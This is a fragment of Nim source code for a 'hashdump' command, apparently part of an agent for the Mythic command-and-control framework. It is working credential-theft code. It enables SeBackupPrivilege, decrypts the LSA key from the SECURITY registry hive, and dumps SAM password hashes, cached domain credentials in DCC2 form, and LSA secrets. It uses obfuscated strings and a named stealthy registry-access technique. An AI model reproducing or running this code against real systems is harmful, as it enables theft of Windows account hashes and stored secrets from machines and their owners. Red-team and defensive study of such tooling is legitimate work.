    let (fVal, fValSuccess) = getValueWithRegQueryMultipleValuesW(hKeyPolEK, "")
    discard NtCloseProc(hKeyPolEK)
    if not fValSuccess or fVal.len < 32:
      return ("", "Failed to read PolEKList value")

    var
      data = fVal[28..<fVal.len]
      dataVal = data[0..<32]
      tempKey = computeSha256(bootKey, dataVal)
      dataVal2 = data[32..<32+data.len - 32]
      decryptedLsaKey: seq[byte] = newSeq[byte](dataVal2.len)
      dctx: ECB[aes256]

    dctx.init(tempKey)
    dctx.decrypt(dataVal2, decryptedLsaKey)
    dctx.clear()
    decryptedLsaKey = decryptedLsaKey[68..<68+32]

    # Find NL$KM CurrVal subkey
    let (hKeyNLKM, nlkmSuccess) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM")
    if not nlkmSuccess:
      return ("", "Failed to open NL$KM key")
    
    index = 0
    while true:
      bufSize = 0
      status = NtEnumerateKeyProc(hKeyNLKM, index, KeyBasicInformation, nil, 0, addr bufSize)
      if status == STATUS_NO_MORE_ENTRIES:
        break
      buf = newSeq[byte](bufSize)
      status = NtEnumerateKeyProc(hKeyNLKM, index, KeyBasicInformation, cast[PVOID](addr buf[0]), bufSize, addr bufSize)
      if status == 0:
        pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
        nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
        pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
        name = ""
        for i in 0 ..< nameLen.int:
          name.add(cast[char](pName[i]))
        if name.contains("CurrVal"):
          currValName = name
          break
      inc index
    discard NtCloseProc(hKeyNLKM)

    if currValName == "":
      return ("", "NLKM CurrVal key not found")

    # Dump NL$KM secret
    let (nlkmKey, nlkmErr) = dumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\" & currValName, decryptedLsaKey)
    if nlkmErr.len > 0:
      return ("", "Failed to dump NL$KM: " & nlkmErr)

    # Cached domain logon credentials
    let (hKeyCache, cacheSuccess) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Cache")
    if cacheSuccess:
      let cachedDomainLogonKeyNames = enumerateValueNames(hKeyCache)
      for domainKeyName in cachedDomainLogonKeyNames:
        let (cachedDomainLogonValue, readOk) = getValueWithRegQueryMultipleValuesW(hKeyCache, domainKeyName)
        if readOk and cachedDomainLogonValue.len > 96:
          if not (cachedDomainLogonValue[0 ..< 16].allIt(it == 0)):
            let cachedUser = initNlRecord(cachedDomainLogonValue)
            let slice = nlkmKey[16..<16+16]
            let decryptedCBC = decryptAES_CBC(cachedUser.EncryptedData, slice, cachedUser.Iv)
            let hashedPW = decryptedCBC[0..<16]
            let sliceUsername = decryptedCBC[72..<72+cachedUser.UserLength]
            let startIndex = 72 + pad(cachedUser.UserLength.int) + pad(cachedUser.DomainNameLength.int)
            let sliceDomain = decryptedCBC[startIndex..<startIndex+pad(cachedUser.DnsDomainLength.int)]
            let domain = seqToUnicode(sliceDomain).replace("\0", "")
            let username = seqToUnicode(sliceUsername)
            output.add("[*] Cached Credential: " & domain & "/" & username & ":$DCC2$10240#" & username & "#" & hashedPW.mapIt(it.toHex(2)).join("").toLower() & "\n")
      discard NtCloseProc(hKeyCache)

    # Enumerate LSA secrets
    let (hKeySecrets, secretsSuccess) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets")
    if secretsSuccess:
      var listOfLSASecrets: seq[string] = @[]
      index = 0
      while true:
        bufSize = 0
        status = NtEnumerateKeyProc(hKeySecrets, index, KeyBasicInformation, nil, 0, addr bufSize)
        if status == STATUS_NO_MORE_ENTRIES:
          break
        buf = newSeq[byte](bufSize)
        status = NtEnumerateKeyProc(hKeySecrets, index, KeyBasicInformation, cast[PVOID](addr buf[0]), bufSize, addr bufSize)
        if status == 0:
          pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
          nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
          pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
          name = ""
          for i in 0 ..< nameLen.int:
            name.add(cast[char](pName[i]))
          if cmpIgnoreCase(name, "NL$Control") != 0:
            listOfLSASecrets.add(name)
        inc index
      discard NtCloseProc(hKeySecrets)

      for lsaSecretString in listOfLSASecrets:
        var secretBlob: LsaSecretBlob
        if cmpIgnoreCase(lsaSecretString, "NL$KM") == 0:
          secretBlob = newLsaSecretBlob(nlkmKey)
          if secretBlob.Length > 0:
            output.add("[*] " & formatLsaSecret(lsaSecretString, secretBlob) & "\n")
        else:
          let (secretData, secretErr) = dumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\" & lsaSecretString & "\\CurrVal", decryptedLsaKey)
          if secretErr.len == 0 and secretData.len > 16:
            secretBlob = newLsaSecretBlob(secretData)
            if secretBlob.Length > 0:
              output.add("[*] " & formatLsaSecret(lsaSecretString, secretBlob) & "\n")

    return (output, "")

  # ============================================================
  # Main hashdump entry point
  # ============================================================

  proc hashdump*(taskId: string, params: JsonNode): JsonNode =
    ## Dump SAM hashes, cached domain credentials, and LSA secrets
    ## Uses Silent Harvest technique (NtOpenKeyEx + RegQueryMultipleValuesW)
    try:
      debug "[DEBUG] hashdump: Starting credential dump"

      # Step 1: Dynamically load required NT functions
      if not dynamicallyLoadFunctions():
        return mythicError(taskId, obf("Failed to dynamically load required NT functions"))
      debug "[DEBUG] hashdump: Functions loaded successfully"

      # Step 2: Enable SeBackupPrivilege
      if not setPrivilege("SeBackupPrivilege"):
        return mythicError(taskId, obf("Failed to enable SeBackupPrivilege - ensure running as Administrator"))
      debug "[DEBUG] hashdump: SeBackupPrivilege enabled"

      var fullOutput: string = ""

      # Step 3: Dump SAM (local user hashes)
      fullOutput.add("=== SAM Dump (Local Users) ===\n\n")
      debug "[DEBUG] hashdump: Starting SAM dump"

      let (bootKey, bootKeyErr) = getBootKey()
      if bootKeyErr.len > 0:
        return mythicError(taskId, obf("Boot key error: ") & bootKeyErr)

      let (sysKey, sysKeyErr) = getSysKey()
      if sysKeyErr.len > 0:
        return mythicError(taskId, obf("SysKey error: ") & sysKeyErr)

      let (hashedBootKey, hbkErr) = getHashedBootKey(sysKey, bootKey)
      if hbkErr.len > 0:
        return mythicError(taskId, obf("Hashed boot key error: ") & hbkErr)

      let (samOutput, samErr) = getSAMDump(hashedBootKey)
      if samErr.len > 0:
        fullOutput.add("[!] SAM dump error: " & samErr & "\n")
      else:
        fullOutput.add(samOutput)

      debug "[DEBUG] hashdump: SAM dump complete"

      # Step 4: Dump Security hive (cached creds + LSA secrets)
      fullOutput.add("\n=== Security Dump (Cached Credentials & LSA Secrets) ===\n\n")
      debug "[DEBUG] hashdump: Starting Security dump"

      let (secOutput, secErr) = getSecurityDump()
      if secErr.len > 0:
        fullOutput.add("[!] Security dump error: " & secErr & "\n")
      else:
        fullOutput.add(secOutput)

      debug "[DEBUG] hashdump: Security dump complete"

      # Remove trailing newline
      if fullOutput.endsWith("\n"):
        fullOutput = fullOutput[0..^2]

      return mythicSuccess(taskId, fullOutput)

    except Exception as e:
      return mythicError(taskId, obf("Hashdump error: ") & e.msg)

when not defined(windows):
  proc hashdump*(taskId: string, params: JsonNode): JsonNode =
    return mythicError(taskId, obf("hashdump command is only available on Windows"))
